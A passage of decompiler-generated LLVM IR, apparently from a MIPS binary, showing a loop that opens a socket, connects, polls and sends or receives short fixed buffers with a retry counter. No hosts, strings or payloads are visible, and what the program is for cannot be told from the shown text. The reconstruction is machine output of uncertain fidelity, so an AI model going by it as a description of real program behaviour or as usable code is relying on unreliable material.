  br i1 %v1_4023d8, label %dec_label_pc_4023f8, label %dec_label_pc_4023dc

dec_label_pc_4023dc:                              ; preds = %dec_label_pc_402368
  %v3_4023e0 = load i32, i32* @global_var_449428.200, align 4
  store i32 %v3_4023e0, i32* @t9, align 4
  %v2_4023e8 = call i32 @function_403260(i32 1)
  store i32 %v2_4023e8, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4023f8

dec_label_pc_4023f8:                              ; preds = %dec_label_pc_402368, %dec_label_pc_4023dc
  %v3_4023f8 = load i32, i32* @global_var_4491e8.9, align 4
  store i32 %v3_4023f8, i32* @v0, align 4
  %v3_4023fc = load i32, i32* @global_var_449300.51, align 4
  store i32 %v3_4023fc, i32* @t9, align 4
  %v3_402400 = load i32, i32* @global_var_449024.201, align 4
  store i32 0, i32* @s5, align 4
  %v2_402404 = call i32 @function_404134(i32 %v3_402400)
  store i32 %v2_402404, i32* %v0.global-to-local, align 4
  %v3_402414 = load i32, i32* @global_var_4493fc.202, align 4
  store i32 %v3_402414, i32* @t9, align 4
  %v1_40241c = call i32 @function_400984()
  store i32 %v1_40241c, i32* %v0.global-to-local, align 4
  store i32 %v2_401f8c, i32* @gp, align 4
  %v2_402434 = ptrtoint i32* %stack_var_-804 to i32
  %v2_402438 = ptrtoint i32* %stack_var_-676 to i32
  %v2_40244c = ptrtoint i32* %stack_var_-548 to i32
  %v2_4025c0 = ptrtoint i32* %stack_var_-980 to i32
  %v4_4025c4 = bitcast i32* %stack_var_-980 to %sockaddr*
  %v4_4025e4 = ptrtoint i16* %stack_var_-1000 to i32
  %v2_402678 = ptrtoint i32* %stack_var_-988 to i32
  %v4_402740 = ptrtoint i32* %stack_var_-992 to i32
  %v3_402758 = ptrtoint i32* %stack_var_-996 to i32
  %v6_40280c = bitcast i16* %stack_var_-1000 to i32*
  %v1_4027a0 = add i32 %v1_401f8c, 291428
  %v2_4027a0 = inttoptr i32 %v1_4027a0 to i32*
  %v1_4027e0 = add i32 %v1_401f8c, 291676
  %v2_4027e0 = inttoptr i32 %v1_4027e0 to i32*
  br label %dec_label_pc_402428

dec_label_pc_402428:                              ; preds = %dec_label_pc_402898, %dec_label_pc_4027d0, %dec_label_pc_4023f8
  store i32 4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40242c

dec_label_pc_40242c:                              ; preds = %dec_label_pc_4028dc, %dec_label_pc_4028dc, %dec_label_pc_402690, %dec_label_pc_4027a0, %dec_label_pc_40276c, %dec_label_pc_4026f0, %dec_label_pc_402428
  store i32 4, i32* %stack_var_-992, align 4
  store i32 0, i32* %stack_var_-996, align 4
  store i32 %v2_402434, i32* %v0.global-to-local, align 4
  store i32 %v2_402438, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_40243c

dec_label_pc_40243c:                              ; preds = %dec_label_pc_40243c, %dec_label_pc_40242c
  %v0_40243c = phi i32 [ %v1_402440, %dec_label_pc_40243c ], [ %v2_402434, %dec_label_pc_40242c ]
  %v1_40243c = inttoptr i32 %v0_40243c to i32*
  store i32 0, i32* %v1_40243c, align 4
  %v0_402440 = load i32, i32* %v0.global-to-local, align 4
  %v1_402440 = add i32 %v0_402440, 4
  store i32 %v1_402440, i32* %v0.global-to-local, align 4
  %v1_402444 = load i32, i32* %v1.global-to-local, align 4
  %v2_402444 = icmp eq i32 %v1_402440, %v1_402444
  br i1 %v2_402444, label %dec_label_pc_402448, label %dec_label_pc_40243c

dec_label_pc_402448:                              ; preds = %dec_label_pc_40243c
  store i32 %v2_40244c, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_402450

dec_label_pc_402450:                              ; preds = %dec_label_pc_402450, %dec_label_pc_402448
  %v0_402450 = phi i32 [ %v1_402454, %dec_label_pc_402450 ], [ %v1_402440, %dec_label_pc_402448 ]
  %v1_402450 = inttoptr i32 %v0_402450 to i32*
  store i32 0, i32* %v1_402450, align 4
  %v0_402454 = load i32, i32* %v0.global-to-local, align 4
  %v1_402454 = add i32 %v0_402454, 4
  store i32 %v1_402454, i32* %v0.global-to-local, align 4
  %v1_402458 = load i32, i32* %v1.global-to-local, align 4
  %v2_402458 = icmp eq i32 %v1_402454, %v1_402458
  br i1 %v2_402458, label %dec_label_pc_40245c, label %dec_label_pc_402450

dec_label_pc_40245c:                              ; preds = %dec_label_pc_402450
  %v0_402460 = load i32, i32* @gp, align 4
  %v1_402460 = add i32 %v0_402460, -32744
  %v2_402460 = inttoptr i32 %v1_402460 to i32*
  %v3_402460 = load i32, i32* %v2_402460, align 4
  store i32 %v3_402460, i32* @s2, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v1_402468 = add i32 %v3_402460, -28632
  %v2_402468 = inttoptr i32 %v1_402468 to i32*
  %v3_402468 = load i32, i32* %v2_402468, align 4
  store i32 %v3_402468, i32* @s1, align 4
  %v2_402470 = icmp eq i32 %v3_402468, -1
  br i1 %v2_402470, label %dec_label_pc_402474, label %dec_label_pc_4025d4

dec_label_pc_402474:                              ; preds = %dec_label_pc_40245c
  %v1_402478 = add i32 %v0_402460, -32420
  %v2_402478 = inttoptr i32 %v1_402478 to i32*
  %v3_402478 = load i32, i32* %v2_402478, align 4
  store i32 ptrtoint (i32* @global_var_402488.203 to i32), i32* @ra, align 4
  call void @__pseudo_call(i32 %v3_402478)
  %v3_402490 = load i32, i32* @global_var_449480.179, align 4
  store i32 %v3_402490, i32* @t9, align 4
  %v2_402498 = call i32 @function_400f98(i32 26)
  store i32 %v2_402498, i32* @v0, align 4
  %v3_4024a8 = load i32, i32* @global_var_4493d4.204, align 4
  store i32 %v3_4024a8, i32* @t9, align 4
  %v3_4024ac = load i32, i32* @global_var_4491e8.9, align 4
  store i32 %v3_4024ac, i32* @s0, align 4
  store i32 16, i32* %a1.global-to-local, align 4
  %v3_4024b0 = call i32 @function_402b38(i32 %v2_402498, i32 16)
  store i32 %v3_4024b0, i32* %v0.global-to-local, align 4
  %v3_4024c0 = load i32, i32* @global_var_449404.182, align 4
  store i32 %v3_4024c0, i32* @t9, align 4
  %v1_4024c4 = icmp eq i32 %v3_4024b0, 0
  store i32 %v3_4024b0, i32* @global_var_449518.156, align 4
  br i1 %v1_4024c4, label %dec_label_pc_4024c8, label %dec_label_pc_4024e8

dec_label_pc_4024c8:                              ; preds = %dec_label_pc_402474
  %v2_4024cc = call i32 @function_400e4c(i32 26)
  store i32 %v2_4024cc, i32* %v0.global-to-local, align 4
  %v3_4024dc = load i32, i32* @global_var_449284.12, align 4
  br label %dec_label_pc_4024e8

dec_label_pc_4024e8:                              ; preds = %dec_label_pc_402474, %dec_label_pc_4024c8
  %v0_4024e8 = phi i32 [ %v3_4024c0, %dec_label_pc_402474 ], [ %v3_4024dc, %dec_label_pc_4024c8 ]
  store i32 ptrtoint (i32* @global_var_4024f0.205 to i32), i32* @ra, align 4
  call void @__pseudo_call(i32 %v0_4024e8)
  %v3_4024f0 = load i32, i32* @global_var_449518.156, align 4
  %v1_4024f8 = add i32 %v3_4024f0, 261
  %v2_4024f8 = inttoptr i32 %v1_4024f8 to i8*
  %v3_4024f8 = load i8, i8* %v2_4024f8, align 1
  %v4_4024f8 = zext i8 %v3_4024f8 to i32
  %v1_402500 = add nuw nsw i32 %v4_4024f8, 254
  %v1_402504 = and i32 %v1_402500, 254
  %v1_402508 = icmp ult i32 %v1_402504, 14
  %v2_402508 = zext i1 %v1_402508 to i32
  store i32 %v2_402508, i32* %v0.global-to-local, align 4
  store i32 2, i32* %a1.global-to-local, align 4
  br i1 %v1_402508, label %dec_label_pc_402544, label %dec_label_pc_402510

dec_label_pc_402510:                              ; preds = %dec_label_pc_4024e8
  %v3_402514 = load i32, i32* @global_var_449284.12, align 4
  store i32 %v3_402514, i32* @t9, align 4
  %v2_40251c = call i32 @function_406080(i32 %v3_4024f0)
  store i32 %v2_40251c, i32* @v0, align 4
  %v3_40252c = load i32, i32* @global_var_449454.5, align 4
  store i32 %v3_40252c, i32* @t9, align 4
  %v2_402534 = call i32 @function_406580(i32 10)
  store i32 %v2_402534, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402544

dec_label_pc_402544:                              ; preds = %dec_label_pc_4024e8, %dec_label_pc_402510
  %v3_402544 = load i32, i32* @global_var_449444.206, align 4
  store i32 %v3_402544, i32* @t9, align 4
  store i32 0, i32* @a2, align 4
  %v3_40254c = call i32 @function_405be0(i32 2, i32 0)
  store i32 %v3_40254c, i32* %v0.global-to-local, align 4
  store i32 %v2_401f8c, i32* @gp, align 4
  %v1_402558 = load i32, i32* @s1, align 4
  %v2_402558 = icmp eq i32 %v3_40254c, %v1_402558
  %v4_402558 = load i32, i32* @s2, align 4
  %v5_402558 = add i32 %v4_402558, -28632
  %v6_402558 = inttoptr i32 %v5_402558 to i32*
  store i32 %v3_40254c, i32* %v6_402558, align 4
  br i1 %v2_402558, label %dec_label_pc_402544.dec_label_pc_4025d4_crit_edge, label %dec_label_pc_40255c

dec_label_pc_402544.dec_label_pc_4025d4_crit_edge: ; preds = %dec_label_pc_402544
  %v0_4025d4.pre = load i32, i32* @gp, align 4
  br label %dec_label_pc_4025d4

dec_label_pc_40255c:                              ; preds = %dec_label_pc_402544
  %v3_402564 = load i32, i32* @global_var_4493cc.207, align 4
  store i32 %v3_402564, i32* @t9, align 4
  %v3_402568 = load i32, i32* @global_var_449518.156, align 4
  store i32 2, i32* %stack_var_-980, align 4
  store i32 -14329, i32* %v0.global-to-local, align 4
  %v7_402574 = call i32 @function_4056f0(i32 %v3_402568)
  store i32 %v7_402574, i32* %v0.global-to-local, align 4
  %v0_402580 = load i32, i32* @s2, align 4
  %v1_402580 = add i32 %v0_402580, -28632
  %v2_402580 = inttoptr i32 %v1_402580 to i32*
  %v3_402580 = load i32, i32* %v2_402580, align 4
  store i32 %v3_402580, i32* @s0, align 4
  %v3_402584 = load i32, i32* @global_var_449294.208, align 4
  store i32 %v3_402584, i32* @t9, align 4
  store i32 3, i32* @a1, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 %v3_402580, i32* @a0, align 4
  %v5_402594 = call i32 @function_4049b0()
  store i32 %v5_402594, i32* %v0.global-to-local, align 4
  %v0_4025a0 = load i32, i32* @s0, align 4
  store i32 %v0_4025a0, i32* @a0, align 4
  %v3_4025a4 = load i32, i32* @global_var_449294.208, align 4
  store i32 %v3_4025a4, i32* @t9, align 4
  %v1_4025a8 = or i32 %v5_402594, 128
  store i32 %v1_4025a8, i32* %a2.global-to-local, align 4
  store i32 4, i32* @a1, align 4
  %v1_4025ac = call i32 @function_4049b0()
  store i32 %v1_4025ac, i32* %v0.global-to-local, align 4
  %v0_4025b8 = load i32, i32* @s2, align 4
  %v1_4025b8 = add i32 %v0_4025b8, -28632
  %v2_4025b8 = inttoptr i32 %v1_4025b8 to i32*
  %v3_4025b8 = load i32, i32* %v2_4025b8, align 4
  %v3_4025bc = load i32, i32* @global_var_4494a8.209, align 4
  store i32 %v3_4025bc, i32* @t9, align 4
  store i32 %v2_4025c0, i32* %a1.global-to-local, align 4
  store i32 16, i32* %a2.global-to-local, align 4
  %v5_4025c4 = call i32 @function_405800(i32 %v3_4025b8, %sockaddr* %v4_4025c4, i32 16)
  store i32 %v5_4025c4, i32* %v0.global-to-local, align 4
  store i32 %v2_401f8c, i32* @gp, align 4
  br label %dec_label_pc_4025d4

dec_label_pc_4025d4:                              ; preds = %dec_label_pc_402544.dec_label_pc_4025d4_crit_edge, %dec_label_pc_40245c, %dec_label_pc_40255c
  %v0_4025e0 = phi i32 [ %v0_4025d4.pre, %dec_label_pc_402544.dec_label_pc_4025d4_crit_edge ], [ %v0_402460, %dec_label_pc_40245c ], [ %v2_401f8c, %dec_label_pc_40255c ]
  %v1_4025d4 = add i32 %v0_4025e0, -32744
  %v2_4025d4 = inttoptr i32 %v1_4025d4 to i32*
  %v3_4025d4 = load i32, i32* %v2_4025d4, align 4
  store i32 %v3_4025d4, i32* %v0.global-to-local, align 4
  %v1_4025dc = add i32 %v3_4025d4, -27372
  %v2_4025dc = inttoptr i32 %v1_4025dc to i8*
  %v3_4025dc = load i8, i8* %v2_4025dc, align 1
  %v4_4025dc = sext i8 %v3_4025dc to i32
  store i32 %v4_4025dc, i32* %a3.global-to-local, align 4
  %v3_4025e0 = load i32, i32* %v2_4025d4, align 4
  store i32 %v3_4025e0, i32* %v0.global-to-local, align 4
  %v1_4025e4 = icmp eq i8 %v3_4025dc, 0
  br i1 %v1_4025e4, label %dec_label_pc_402638, label %dec_label_pc_4025e8

dec_label_pc_4025e8:                              ; preds = %dec_label_pc_4025d4
  %v1_4025ec = add i32 %v3_4025e0, -28632
  %v2_4025ec = inttoptr i32 %v1_4025ec to i32*
  %v3_4025ec = load i32, i32* %v2_4025ec, align 4
  store i32 %v3_4025ec, i32* %a1.global-to-local, align 4
  store i32 1, i32* %a2.global-to-local, align 4
  %v1_4025f4 = udiv i32 %v3_4025ec, 32
  %v1_4025f8 = mul nuw nsw i32 %v1_4025f4, 4
  %v2_4025fc = add i32 %v1_4025f8, %v4_4025e4
  store i32 %v2_4025fc, i32* %v1.global-to-local, align 4
  %v1_402600 = add i32 %v2_4025fc, 196
  %v2_402600 = inttoptr i32 %v1_402600 to i32*
  %v3_402600 = load i32, i32* %v2_402600, align 4
  %v2_402604 = shl i32 1, %v3_4025ec
  %v2_402608 = or i32 %v3_402600, %v2_402604
  store i32 %v2_402608, i32* %v2_402600, align 4
  store i32 10, i32* %v0.global-to-local, align 4
  store i32 10, i32* %stack_var_-988, align 4
  %v0_40261c = load i32, i32* %a3.global-to-local, align 4
  %v1_40261c = load i32, i32* %a2.global-to-local, align 4
  %v2_40261c = icmp eq i32 %v0_40261c, %v1_40261c
  %v3_40261c = load i32, i32* %a1.global-to-local, align 4
  %v4_40261c = add i32 %v3_40261c, 1
  br i1 %v2_40261c, label %dec_label_pc_402620, label %dec_label_pc_402630

dec_label_pc_402620:                              ; preds = %dec_label_pc_4025e8
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 %v2_402434, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_402630

dec_label_pc_402630:                              ; preds = %dec_label_pc_4025e8, %dec_label_pc_402620
  store i32 0, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_402638

dec_label_pc_402638:                              ; preds = %dec_label_pc_4025d4, %dec_label_pc_402630
  %v1_402648 = phi i32 [ %v4_4025e4, %dec_label_pc_4025d4 ], [ %v4_40261c, %dec_label_pc_402630 ]
  %v0_402638 = phi i32 [ %v3_4025e0, %dec_label_pc_4025d4 ], [ 10, %dec_label_pc_402630 ]
  %v1_402638 = add i32 %v0_402638, -28632
  %v2_402638 = inttoptr i32 %v1_402638 to i32*
  %v3_402638 = load i32, i32* %v2_402638, align 4
  store i32 %v3_402638, i32* %a1.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  %v1_402640 = udiv i32 %v3_402638, 32
  %v1_402644 = mul nuw nsw i32 %v1_402640, 4
  %v2_402648 = add i32 %v1_402644, %v1_402648
  store i32 %v2_402648, i32* %v1.global-to-local, align 4
  %v1_40264c = add i32 %v2_402648, 324
  %v2_40264c = inttoptr i32 %v1_40264c to i32*
  %v3_40264c = load i32, i32* %v2_40264c, align 4
  %v2_402650 = shl i32 1, %v3_402638
  %v2_402654 = or i32 %v3_40264c, %v2_402650
  store i32 10, i32* %v0.global-to-local, align 4
  store i32 %v2_402654, i32* %v2_40264c, align 4
  %v0_402660 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_402660, i32* %stack_var_-988, align 4
  store i32 %v2_402438, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v0_402674 = load i32, i32* @gp, align 4
  %v1_402674 = add i32 %v0_402674, -32144
  %v2_402674 = inttoptr i32 %v1_402674 to i32*
  %v3_402674 = load i32, i32* %v2_402674, align 4
  store i32 %v2_402678, i32* %v0.global-to-local, align 4
  store i32 0, i32* %a3.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_402674)
  store i32 %v2_401f8c, i32* @gp, align 4
  %v0_40268c = load i32, i32* %v0.global-to-local, align 4
  %v1_40268c = icmp eq i32 %v0_40268c, 0
  store i32 %v2_402678, i32* %v1.global-to-local, align 4
  br i1 %v1_40268c, label %dec_label_pc_402690, label %dec_label_pc_4026f0.thread

dec_label_pc_4026f0.thread:                       ; preds = %dec_label_pc_402638
  store i32 4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4026f8

dec_label_pc_402690:                              ; preds = %dec_label_pc_402638
  %v0_402698 = load i32, i32* @s5, align 4
  %v1_402698 = add i32 %v0_402698, 1
  store i32 %v1_402698, i32* @s5, align 4
  %v2_4026a0 = sext i32 %v1_402698 to i64
  %v4_4026a0 = mul nsw i64 %v2_4026a0, 715827883
  %v6_4026a0 = udiv i64 %v4_4026a0, 4294967296
  %v7_4026a0 = trunc i64 %v6_4026a0 to i32
  %v1_4026a4 = ashr i32 %v1_402698, 31
  %v2_4026ac = sub i32 %v7_4026a0, %v1_4026a4
  %v2_4026b8 = mul i32 %v2_4026ac, 6
  store i32 %v2_4026b8, i32* %v1.global-to-local, align 4
  %v2_4026bc = icmp eq i32 %v1_402698, %v2_4026b8
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v2_4026bc, label %dec_label_pc_4026f0, label %dec_label_pc_40242c

dec_label_pc_4026f0:                              ; preds = %dec_label_pc_402690
  %v3_4026c4 = load i32, i32* @global_var_4491e8.9, align 4
  store i32 %v3_4026c4, i32* %v0.global-to-local, align 4
  %v3_4026cc = load i32, i32* @global_var_449420.211, align 4
  store i32 %v3_4026cc, i32* @t9, align 4
  %v3_4026d0 = load i32, i32* @global_var_449028.155, align 4
  store i32 ptrtoint (i32* @global_var_4083a0.212 to i32), i32* %a1.global-to-local, align 4
  store i32 6, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_4026dc = call i32 @function_405a80(i32 %v3_4026d0, i32* nonnull @global_var_4083a0.212, i32 6, i32 16384)
  store i32 %v2_401f8c, i32* @gp, align 4
  store i32 0, i32* @s5, align 4
  %v0_4026f4.pr = load i32, i32* %v1.global-to-local, align 4
  %v2_4026f4 = icmp eq i32 %v0_4026f4.pr, -1
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v2_4026f4, label %dec_label_pc_40242c, label %dec_label_pc_4026f8

dec_label_pc_4026f8:                              ; preds = %dec_label_pc_4026f0.thread, %dec_label_pc_4026f0
  %v3_4026fc = load i32, i32* @global_var_4491e8.9, align 4
  store i32 %v3_4026fc, i32* @s0, align 4
  %v3_402704 = load i8, i8* @global_var_449514.157, align 1
  %v4_402704 = sext i8 %v3_402704 to i32
  store i32 %v4_402704, i32* %v0.global-to-local, align 4
  %v1_40270c = icmp eq i8 %v3_402704, 0
  br i1 %v1_40270c, label %dec_label_pc_402710, label %dec_label_pc_4027a0

dec_label_pc_402710:                              ; preds = %dec_label_pc_4026f8
  store i32 %v3_4026fc, i32* @s1, align 4
  %v3_40271c = load i32, i32* @global_var_449028.155, align 4
  %v1_402724 = udiv i32 %v3_40271c, 32
  %v1_402728 = mul nuw nsw i32 %v1_402724, 4
  %v0_40272c = load i32, i32* @sp, align 4
  %v2_40272c = add i32 %v0_40272c, %v1_402728
  store i32 %v2_40272c, i32* %v0.global-to-local, align 4
  %v1_402730 = add i32 %v2_40272c, 356
  %v2_402730 = inttoptr i32 %v1_402730 to i32*
  %v3_402730 = load i32, i32* %v2_402730, align 4
  %tmp58 = shl i32 1, %v3_40271c
  %v1_40273c3 = and i32 %v3_402730, %tmp58
  %v1_402740 = icmp eq i32 %v1_40273c3, 0
  store i32 %v4_402740, i32* %v0.global-to-local, align 4
  br i1 %v1_402740, label %dec_label_pc_4028c0, label %dec_label_pc_402744

dec_label_pc_402744:                              ; preds = %dec_label_pc_402710
  %v3_402748 = load i32, i32* @global_var_449304.213, align 4
  store i32 %v3_402748, i32* @t9, align 4
  store i32 65535, i32* %a1.global-to-local, align 4
  store i32 4103, i32* %a2.global-to-local, align 4
  store i32 %v3_402758, i32* %a3.global-to-local, align 4
  %v10_402758 = call i32 @function_4058c0(i32 %v3_40271c, i32 65535, i32 4103, i32* nonnull %stack_var_-996, i32 %v4_402740)
  %v3_402760 = load i32, i32* %stack_var_-996, align 4
  store i32 %v2_401f8c, i32* @gp, align 4
  %v1_402768 = icmp eq i32 %v3_402760, 0
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v1_402768, label %dec_label_pc_40276c, label %dec_label_pc_4028c0

dec_label_pc_40276c:                              ; preds = %dec_label_pc_402744
  %v3_402774 = load i32, i32* @global_var_449420.211, align 4
  store i32 %v3_402774, i32* @t9, align 4
  %v3_402778 = load i32, i32* @global_var_449028.155, align 4
  store i8 1, i8* @global_var_449514.157, align 1
  store i32 ptrtoint (i32* @global_var_4083a8.214 to i32), i32* %a1.global-to-local, align 4
  store i32 6, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_402788 = call i32 @function_405a80(i32 %v3_402778, i32* nonnull @global_var_4083a8.214, i32 6, i32 16384)
  %v3_402790 = load i8, i8* @global_var_449514.157, align 1
  store i32 %v2_401f8c, i32* @gp, align 4
  %v1_402798 = icmp eq i8 %v3_402790, 0
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v1_402798, label %dec_label_pc_40242c, label %dec_label_pc_4027a0

dec_label_pc_4027a0:                              ; preds = %dec_label_pc_40276c, %dec_label_pc_4026f8
  %v3_4027a0 = load i32, i32* %v2_4027a0, align 4
  store i32 %v3_4027a0, i32* @s3, align 4
  store i32 %v4_4025e4, i32* @s4, align 4
  %v1_4027a8 = add i32 %v3_4027a0, -28632
  %v2_4027a8 = inttoptr i32 %v1_4027a8 to i32*
  %v3_4027a8 = load i32, i32* %v2_4027a8, align 4
  store i32 %v3_4027a8, i32* @s0, align 4
  %v1_4027b0 = udiv i32 %v3_4027a8, 32
  %v1_4027b4 = mul nuw nsw i32 %v1_4027b0, 4
  %v2_4027b8 = add i32 %v1_4027b4, %v4_4025e4
  store i32 %v2_4027b8, i32* %v0.global-to-local, align 4
  %v1_4027bc = add i32 %v2_4027b8, 196
  %v2_4027bc = inttoptr i32 %v1_4027bc to i32*
  %v3_4027bc = load i32, i32* %v2_4027bc, align 4
  %tmp59 = shl i32 1, %v3_4027a8
  %v1_4027c82 = and i32 %v3_4027bc, %tmp59
  %v1_4027cc = icmp eq i32 %v1_4027c82, 0
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v1_4027cc, label %dec_label_pc_40242c, label %dec_label_pc_4027d0

dec_label_pc_4027d0:                              ; preds = %dec_label_pc_4027a0
  store i32 -1, i32* @s2, align 4
  %v2_4027d8 = icmp eq i32 %v3_4027a8, -1
  store i32 6, i32* %v0.global-to-local, align 4
  br i1 %v2_4027d8, label %dec_label_pc_402428, label %dec_label_pc_4027dc

dec_label_pc_4027dc:                              ; preds = %dec_label_pc_4027d0
  %v3_4027e0 = load i32, i32* %v2_4027e0, align 4
  store i16 6, i16* %stack_var_-1000, align 2
  call void @__pseudo_call(i32 %v3_4027e0)
  %v0_4027f4 = load i32, i32* @s0, align 4
  %v3_4027f8 = load i32, i32* @global_var_4494ac.216, align 4
  store i32 %v3_4027f8, i32* @t9, align 4
  %v0_4027fc = load i32, i32* %v0.global-to-local, align 4
  %v1_4027fc = inttoptr i32 %v0_4027fc to i32*
  store i32 0, i32* %v1_4027fc, align 4
  store i32 %v4_4025e4, i32* %a1.global-to-local, align 4
  store i32 2, i32* %a2.global-to-local, align 4
  store i32 16386, i32* %a3.global-to-local, align 4
  %v1_40280c = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_40280c, i32* @s1, align 4
  %v7_40280c = call i32 @function_4059a0(i32 %v0_4027f4, i32* %v6_40280c, i32 2, i32 16386)
  store i32 %v7_40280c, i32* %v0.global-to-local, align 4
  store i32 %v2_401f8c, i32* @gp, align 4
  %v1_402818 = load i32, i32* @s2, align 4
  %v2_402818 = icmp eq i32 %v7_40280c, %v1_402818
  br i1 %v2_402818, label %dec_label_pc_402898, label %dec_label_pc_40281c

dec_label_pc_40281c:                              ; preds = %dec_label_pc_4027dc
  %v1_402820 = icmp eq i32 %v7_40280c, 0
  br i1 %v1_402820, label %dec_label_pc_4028c0, label %dec_label_pc_402824

dec_label_pc_402824:                              ; preds = %dec_label_pc_40281c
  %v3_402828 = load i16, i16* %stack_var_-1000, align 2
  %v4_402828 = sext i16 %v3_402828 to i32
  store i32 %v4_402828, i32* %v1.global-to-local, align 4
  %v1_402830 = icmp eq i16 %v3_402828, 0
  %v3_402830 = urem i32 %v4_402828, 256
  store i32 %v3_402830, i32* %v0.global-to-local, align 4
  br i1 %v1_402830, label %dec_label_pc_402834, label %dec_label_pc_402858

dec_label_pc_402834:                              ; preds = %dec_label_pc_402824
  %v0_402838 = load i32, i32* @s3, align 4
  %v1_402838 = add i32 %v0_402838, -28632
  %v2_402838 = inttoptr i32 %v1_402838 to i32*
  %v3_402838 = load i32, i32* %v2_402838, align 4
  %v3_40283c = load i32, i32* @global_var_4494ac.216, align 4
  store i32 %v3_40283c, i32* @t9, align 4
  store i32 %v4_4025e4, i32* %a1.global-to-local, align 4
  store i32 2, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_402848 = call i32 @function_4059a0(i32 %v3_402838, i32* nonnull %v6_40280c, i32 2, i32 16384)
  store i32 %v6_402848, i32* %v0.global-to-local, align 4
  %v0_40285c.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_402858

dec_label_pc_402858:                              ; preds = %dec_label_pc_402824, %dec_label_pc_402834
  %v0_40285c = phi i32 [ %v4_402828, %dec_label_pc_402824 ], [ %v0_40285c.pre, %dec_label_pc_402834 ]
  %v0_402858 = phi i32 [ %v3_402830, %dec_label_pc_402824 ], [ %v6_402848, %dec_label_pc_402834 ]
  %v1_402858 = mul i32 %v0_402858, 256
  %v1_40285c = udiv i32 %v0_40285c, 256
  store i32 %v1_40285c, i32* %v1.global-to-local, align 4
  %v2_402860 = or i32 %v1_402858, %v1_40285c
  %v3_402860 = trunc i32 %v2_402860 to i16
  store i32 %v2_402860, i32* %a2.global-to-local, align 4
  %v2_402864 = icmp ult i16 %v3_402860, 513
  %v3_402864 = zext i1 %v2_402864 to i32
  store i32 %v3_402864, i32* %v0.global-to-local, align 4
  %v1_402868 = icmp eq i1 %v2_402864, false
  store i16 %v3_402860, i16* %stack_var_-1000, align 2
  br i1 %v1_402868, label %dec_label_pc_402858.dec_label_pc_4028c0_crit_edge, label %dec_label_pc_40286c

dec_label_pc_402858.dec_label_pc_4028c0_crit_edge: ; preds = %dec_label_pc_402858
  %v0_4028c0.pre = load i32, i32* @gp, align 4
  br label %dec_label_pc_4028c0

dec_label_pc_40286c:                              ; preds = %dec_label_pc_402858
  %v0_402870 = load i32, i32* @s1, align 4
  %v1_402870 = inttoptr i32 %v0_402870 to i32*
  store i32 0, i32* %v1_402870, align 4
  %v3_402874 = load i32, i32* @global_var_4494ac.216, align 4
  store i32 %v3_402874, i32* @t9, align 4
  store i32 %v2_40244c, i32* @s0, align 4
  %v0_40287c = load i32, i32* @s3, align 4
  %v1_40287c = add i32 %v0_40287c, -28632
  %v2_40287c = inttoptr i32 %v1_40287c to i32*
  %v3_40287c = load i32, i32* %v2_40287c, align 4
  store i32 %v2_40244c, i32* %a1.global-to-local, align 4
  store i32 16386, i32* %a3.global-to-local, align 4
  %v4_402884 = sext i16 %v3_402860 to i32
  %v9_402884 = call i32 @function_4059a0(i32 %v3_40287c, i32* nonnull %stack_var_-548, i32 %v4_402884, i32 16386)
  store i32 %v9_402884, i32* %v0.global-to-local, align 4
  store i32 %v2_401f8c, i32* @gp, align 4
  %v1_402890 = load i32, i32* @s2, align 4
  %v2_402890 = icmp eq i32 %v9_402884, %v1_402890
  br i1 %v2_402890, label %dec_label_pc_402898, label %dec_label_pc_4028b8

dec_label_pc_402898:                              ; preds = %dec_label_pc_40286c, %dec_label_pc_4027dc
  %v0_402898 = load i32, i32* @s1, align 4
  %v1_402898 = inttoptr i32 %v0_402898 to i32*
  %v2_402898 = load i32, i32* %v1_402898, align 4
  store i32 %v2_402898, i32* %v1.global-to-local, align 4
  store i32 4, i32* %v0.global-to-local, align 4
  switch i32 %v2_402898, label %dec_label_pc_4028c0 [
    i32 11, label %dec_label_pc_402428
    i32 4, label %dec_label_pc_4028b8.thread
  ]

dec_label_pc_4028b8.thread:                       ; preds = %dec_label_pc_402898
  store i32 4, i32* %stack_var_-992, align 4
  store i32 %v4_4025e4, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_4028dc

dec_label_pc_4028b8:                              ; preds = %dec_label_pc_40286c
  %v1_4028b8 = icmp eq i32 %v9_402884, 0
  store i32 %v4_4025e4, i32* %a1.global-to-local, align 4
  br i1 %v1_4028b8, label %dec_label_pc_4028c0, label %dec_label_pc_4028dc

dec_label_pc_4028c0:                              ; preds = %dec_label_pc_402898, %dec_label_pc_402858.dec_label_pc_4028c0_crit_edge, %dec_label_pc_4028b8, %dec_label_pc_402744, %dec_label_pc_40281c, %dec_label_pc_402710
  %v0_4028c0 = phi i32 [ %v0_4028c0.pre, %dec_label_pc_402858.dec_label_pc_4028c0_crit_edge ], [ %v2_401f8c, %dec_label_pc_4028b8 ], [ %v2_401f8c, %dec_label_pc_402744 ], [ %v2_401f8c, %dec_label_pc_40281c ], [ %v2_401f8c, %dec_label_pc_402710 ], [ %v2_401f8c, %dec_label_pc_402898 ]
  %v1_4028c0 = add i32 %v0_4028c0, -32736
  %v2_4028c0 = inttoptr i32 %v1_4028c0 to i32*
